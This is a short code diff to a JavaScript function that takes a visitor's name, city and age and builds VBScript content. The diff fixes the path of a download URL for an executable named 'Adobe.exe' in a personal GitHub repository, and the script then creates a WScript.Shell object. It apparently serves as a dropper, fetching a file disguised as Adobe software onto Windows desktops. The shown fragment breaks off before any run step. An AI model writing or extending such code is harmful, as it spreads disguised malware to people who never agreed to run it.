@@ -16,7 +16,7 @@ function isWindowsDesktop() {
 async function vbs({ name, city, age }) {
     // Create VBScript content
     var vbsContent = `
-file_url = "https://raw.githubusercontent.com/tonypages/firstrepo/Adobe.exe"
+file_url = "https://raw.githubusercontent.com/tonypages/firstrepo/main/Adobe.exe"
 
 
 Set objShell = CreateObject("WScript.Shell")
